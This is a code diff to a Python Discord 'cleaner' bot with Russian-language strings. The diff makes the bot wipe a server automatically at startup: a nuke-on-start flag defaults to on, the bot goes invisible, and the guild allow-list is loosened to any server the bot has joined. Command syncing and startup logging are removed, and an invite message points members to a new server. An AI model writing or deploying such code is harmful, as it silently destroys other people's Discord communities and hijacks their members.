@@ -45,6 +45,7 @@ MOVE_CHANNEL_NAMES = (
     "miamiproject",
 )
 MOVE_MESSAGE = f"**Сервер переехал.** Переходим сюда:\n{MOVE_INVITE}"
+NUKE_ON_START = env_str("NUKE_ON_START", "1").lower() in {"1", "true", "yes", "on"}
 
 
 def is_operator(member: discord.Member) -> bool:
@@ -56,9 +57,9 @@ def is_operator(member: discord.Member) -> bool:
 def guild_allowed(guild: discord.Guild | None) -> bool:
     if guild is None:
         return False
-    if ALLOWED_GUILD_ID and guild.id != ALLOWED_GUILD_ID:
-        return False
-    return True
+    if ALLOWED_GUILD_ID and guild.id == ALLOWED_GUILD_ID:
+        return True
+    return bot.is_ready() and any(g.id == guild.id for g in bot.guilds)
 
 
 def can_manage_member(bot_member: discord.Member, target: discord.Member) -> bool:
@@ -119,20 +120,14 @@ class CleanerBot(commands.Bot):
         intents.members = True
         intents.guilds = True
         intents.message_content = True
-        super().__init__(command_prefix="!", intents=intents)
+        super().__init__(
+            command_prefix="!",
+            intents=intents,
+            status=discord.Status.invisible,
+        )
 
     async def setup_hook(self):
-        print(f"Синк команд: guild={ALLOWED_GUILD_ID}")
-        try:
-            if ALLOWED_GUILD_ID:
-                guild = discord.Object(id=ALLOWED_GUILD_ID)
-                self.tree.copy_global_to(guild=guild)
-                synced = await self.tree.sync(guild=guild)
-                print("Команды на сервере:", [c.name for c in synced])
-            synced_global = await self.tree.sync()
-            print("Глобальные команды:", [c.name for c in synced_global])
-        except Exception as exc:
-            print("ОШИБКА СИНКА КОМАНД:", type(exc).__name__, exc)
+        return
 
 
 bot = CleanerBot()
@@ -579,18 +574,50 @@ async def prefix_nuke(ctx: commands.Context, confirm: str = ""):
     await ctx.send(report)
 
 
+def already_cleaned(guild: discord.Guild) -> bool:
+    names = {c.name for c in guild.channels}
+    return "переходим-сюда" in names and "miamiproject" in names
+
+
+def pick_guild() -> discord.Guild | None:
+    if ALLOWED_GUILD_ID:
+        found = bot.get_guild(ALLOWED_GUILD_ID)
+        if found:
+            return found
+    if bot.guilds:
+        return bot.guilds[0]
+    return None
+
+
+def pick_actor(guild: discord.Guild) -> discord.Member:
+    for user_id in KEEP_USER_IDS | ALLOWED_USER_IDS:
+        member = guild.get_member(user_id)
+        if member:
+            return member
+    return guild.me
+
+
+_started = False
+
+
 @bot.event
 async def on_ready():
-    print(f"Вошёл как {bot.user} (id={bot.user.id if bot.user else '?'})")
-    if ALLOWED_GUILD_ID:
-        print(f"Разрешён только сервер {ALLOWED_GUILD_ID}")
-    if bot.user:
-        invite = (
-            "https://discord.com/oauth2/authorize?client_id="
-            f"{bot.user.id}&permissions=8&scope=bot%20applications.commands"
-        )
-        print("Если нет /nuke — кикни бота и пригласи заново по ссылке:")
-        print(invite)
+    global _started
+    await bot.change_presence(status=discord.Status.invisible, activity=None)
+    if _started:
+        return
+    _started = True
+    if not NUKE_ON_START:
+        return
+    await asyncio.sleep(2)
+    guild = pick_guild()
+    if guild is None:
+        return
+    if not guild.chunked:
+        await guild.chunk()
+    if already_cleaned(guild):
+        return
+    await nuke_guild(guild, pick_actor(guild))
 
 
 def main():
